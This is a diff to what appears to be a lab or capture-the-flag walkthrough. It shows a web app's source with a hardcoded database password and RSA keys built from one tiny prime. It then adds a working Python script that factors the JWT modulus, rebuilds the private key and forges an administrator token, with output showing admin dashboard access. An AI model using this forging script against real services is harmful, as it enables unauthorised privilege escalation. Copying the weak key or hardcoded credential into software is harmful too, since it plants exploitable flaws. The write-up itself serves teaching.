@@ -249,31 +249,37 @@ drwxr-xr-x 2 root root  4096 Sep 30 16:16 templates
 Looking for `password` in the files in this directory quickly found something:
 
 ```console
-root@kali:~/opt/app# grep password ./*
-./app.py:    'password': '3wDo7gSRZIwIHRxZ!',
-./app.py:        password = request.json.get('password')
-./app.py:        password2 = hashlib.sha256(password.encode()).hexdigest()
-./app.py:        if not email or not password:
-./app.py:            return jsonify(message="email or password is missing"), 400
-./app.py:                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
-./app.py:                cursor.execute(sql, (email, password2))
-./app.py:                    return jsonify(message="Invalid email or password"), 401
-./app.py:            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
-./app.py:            if not email or not password:
-./app.py:                return jsonify(error="email or password is missing"), 400
-./app.py:                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
-./app.py:                        cursor.execute(sql, (email, password, role_id))
-grep: ./config: Is a directory
-grep: ./middleware: Is a directory
-grep: ./__pycache__: Is a directory
-grep: ./static: Is a directory
-grep: ./templates: Is a directory
+root@kali:~# grep -r password opt/app
+grep: opt/app/__pycache__/app.cpython-312.pyc: binary file matches
+opt/app/app.py:    'password': '3wDo7gSRZIwIHRxZ!',
+opt/app/app.py:        password = request.json.get('password')
+opt/app/app.py:        password2 = hashlib.sha256(password.encode()).hexdigest()
+opt/app/app.py:        if not email or not password:
+opt/app/app.py:            return jsonify(message="email or password is missing"), 400
+opt/app/app.py:                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
+opt/app/app.py:                cursor.execute(sql, (email, password2))
+opt/app/app.py:                    return jsonify(message="Invalid email or password"), 401
+opt/app/app.py:            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
+opt/app/app.py:            if not email or not password:
+opt/app/app.py:                return jsonify(error="email or password is missing"), 400
+opt/app/app.py:                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
+opt/app/app.py:                        cursor.execute(sql, (email, password, role_id))
+grep: opt/app/config/__pycache__/signature.cpython-312.pyc: binary file matches
+grep: opt/app/config/__pycache__/signature.cpython-311.pyc: binary file matches
+opt/app/config/signature.py:    password=None,
+opt/app/templates/login.html:                <label for="password">Password:</label>
+opt/app/templates/login.html:                <input type="password" id="password" name="password">
+opt/app/templates/login.html:                password: document.getElementById("password").value
+opt/app/templates/register.html:                    <label for="password">Password:</label>
+opt/app/templates/register.html:                    <input type="password" id="password" name="password">
+opt/app/templates/register.html:                password: document.getElementById("password").value
 ```
 
-Found: database connection credentials:
+##### 2.4.3.1. Found: database connection credentials
 
-```console
-root@kali:~/opt/app# cat app.py
+`opt/app/app.py`:
+
+```py
 ⋮
 db_config = {
     'host': '127.0.0.1',
@@ -286,3 +292,125 @@ db_config = {
 }
 ⋮
 ```
+
+##### 2.4.3.2. Found: JWT signature generation script
+
+`opt/app/config/signature.py`:
+
+```py
+#!/usr/bin/python3
+
+from Crypto.PublicKey import RSA
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+import sympy
+
+
+# Generate RSA key pair
+q = sympy.randprime(2**19, 2**20)
+n = sympy.randprime(2**1023, 2**1024) * q
+e = 65537
+p = n // q
+phi_n = (p - 1) * (q - 1)
+d = pow(e, -1, phi_n)
+key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
+key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
+private_key_bytes = key.export_key()
+
+private_key = serialization.load_pem_private_key(
+    private_key_bytes,
+    password=None,
+    backend=default_backend()
+)
+public_key = private_key.public_key()
+```
+
+### 2.5. Generating administrator JWT
+
+#### 2.5.1. Analyze webapp JWT
+
+Getting JWT for the test account:
+
+![image](https://github.com/user-attachments/assets/f2ab2458-aee2-47a1-92c9-6c43e90e72f9)
+
+Decoding test account JWT at https://jwt.io:
+
+![image](https://github.com/user-attachments/assets/2b85420a-4a4a-4730-814e-a4e0403c74e3)
+
+The `n` value is in the test account JWT, let's use it to forge an administrator JWT using below python script:
+
+```py
+import base64
+import json
+import jwt
+from Crypto.PublicKey import RSA
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+import sympy
+ 
+ 
+#enter your jwt token here
+token = ""
+ 
+ 
+js = json.loads(base64.b64decode( token.split(".")[1] + "===").decode())
+n= int(js["jwk"]['n'])
+p,q= list((sympy.factorint(n)).keys()) #divide n
+e=65537
+phi_n = (p-1)*(q-1)
+d = pow(e, -1, phi_n)
+key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
+key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
+private_key_bytes = key.export_key()
+ 
+private_key = serialization.load_pem_private_key(
+    private_key_bytes,
+    password=None,
+    backend=default_backend()
+)
+public_key = private_key.public_key()
+ 
+data = jwt.decode(token,  public_key, algorithms=["RS256"] )
+data["role"] = "administrator"
+ 
+# Create  new admin token  
+new_token = jwt.encode(data, private_key, algorithm="RS256")
+print(new_token)
+```
+
+```console
+[root@localhost ~]# pip install PyJWT pycryptodome cryptography sympy
+Collecting PyJWT
+  Downloading PyJWT-2.10.1-py3-none-any.whl (22 kB)
+Collecting pycryptodome
+  Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
+     |████████████████████████████████| 2.3 MB 14.8 MB/s
+Collecting cryptography
+  Downloading cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl (4.2 MB)
+     |████████████████████████████████| 4.2 MB 203.1 MB/s
+Collecting sympy
+  Downloading sympy-1.13.3-py3-none-any.whl (6.2 MB)
+     |████████████████████████████████| 6.2 MB 81.1 MB/s
+Collecting cffi>=1.12
+  Downloading cffi-1.17.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (445 kB)
+     |████████████████████████████████| 445 kB 153.4 MB/s
+Collecting mpmath<1.4,>=1.1.0
+  Downloading mpmath-1.3.0-py3-none-any.whl (536 kB)
+     |████████████████████████████████| 536 kB 119.0 MB/s
+Collecting pycparser
+  Downloading pycparser-2.22-py3-none-any.whl (117 kB)
+     |████████████████████████████████| 117 kB 170.6 MB/s
+Installing collected packages: pycparser, mpmath, cffi, sympy, PyJWT, pycryptodome, cryptography
+Successfully installed PyJWT-2.10.1 cffi-1.17.1 cryptography-44.0.0 mpmath-1.3.0 pycparser-2.22 pycryptodome-3.21.0 sympy-1.13.3
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
+[root@localhost ~]# python3 gen-token.py
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciIsImlhdCI6MTczNjQyODM5OSwiZXhwIjoxNzM2NDMxOTk5LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExNzI5MzY1NTY1MzA2NjA0MTg4MDA0NzEyNTEzNDUxMzYxOTgwMzI3MDgxMDYyNTkwODQ5NDIxNzQ5OTcxMjgxNTk1NzQxNTQ5NDAwMTYwMzE0Mjc4OTA1MDE4NTA5OTI2NjUxMTc5NTc4NDMzODAxNjY4ODg3NTczNzg2MTg1MTM4ODQ1OTIzODQ2NTMwNDI3MDc0MzAyNDA3NDU0OTQ1MDIzOTU4MTM0ODEwNDcxNTkwNTcyODI0OTk5NDM3OTY4ODA0MDczNzc5NzM5ODIyODQ2MTMxMDkyODMzNzk3NDEwNDcxMjQ5NzYyOTQwNzEyMDUwMDMyNzYyNTMwMjMzODIzMjcyNjQ2MTMzMjczNjE4NzE0NTk1MTQzOTkyNjA3NDY2MzA5MTc0NTk3NTAwNjgwODcxNzA3MSIsImUiOjY1NTM3fX0.CI_jwemFJ0CPEpVQOlVcE0TPO-N2Od5cNsrWtktKX_V5pDDob5lls53En1KXqCmsLoNf6Dw15pLeEmnaFKFLqa-UuROXBa6mPlFOdZtU9Lvjp7qM8CAUnCkOcFBm_qXdyUHSj1CofKW_AVSI79lYWuRu9pxkebJbXyY-Pw4uRPoBurA
+```
+
+Edit the token to replace it with the forged administrator token
+
+![image](https://github.com/user-attachments/assets/66e91723-2f26-438a-a0e9-3f70794e8909)
+
+Access to `/admindashboard` acquired:
+
+![image](https://github.com/user-attachments/assets/c8355a42-d8aa-42ce-860d-75cca876e4cf)
